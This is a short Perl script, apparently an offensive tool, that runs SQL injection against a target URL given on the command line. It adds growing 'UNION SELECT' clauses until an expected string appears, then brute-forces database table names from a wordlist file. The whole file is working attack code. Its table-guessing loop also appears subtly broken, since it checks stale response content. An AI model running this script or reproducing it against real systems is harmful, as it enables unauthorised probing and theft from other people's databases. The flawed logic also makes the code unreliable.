#!/usr/bin/perl

use LWP;
$browser = LWP::UserAgent->new;

if (@ARGV < 3) {
	print "Usage: $0 http://target/ expected_string database"; 
}

$tables = "1";
$n = "0";

$target = $ARGV[0];
$expected = $ARGV[1];
$db = $ARGV[2];

print "\ntarget:    $target\n";
print "expected:  $expected\n";
print "database:  $db\n";

open(DICT, "dict.txt") || die "No such file.\n";
@guess=<DICT>;
close(DICT);
$words = scalar(@guess); 
print "words:     $words\n\n";

loop();

sub loop {
$test = " UNION SELECT $tables";

$response = $browser->get( $target .  $test );

$_ = $response->content;

if (m/$expected/) {
	print "\narguments:  $nulls \n\n";
	brute();
}
else {
	$nulls = $nulls + 1;
	$tables = "$tables,1";
	print "$test\n";
	loop();
}
}

sub brute {
chomp $guess[$n];

$db_test = "FROM $db.$guess[$n] WHERE 1=0";

$response = $browser->get( $target . $test . $db_test );

if (m/$expected/) {
	print "$test $db_test";
	print "\ntable:     $guess[$n]\n";
	if ($words > $n) {
	$n = $n + 1;
	brute();
	}
}
else {
	$n = $n + 1;
	print "$test $db_test\n";
	if ($words > $n) {
	brute();
	}
}
}
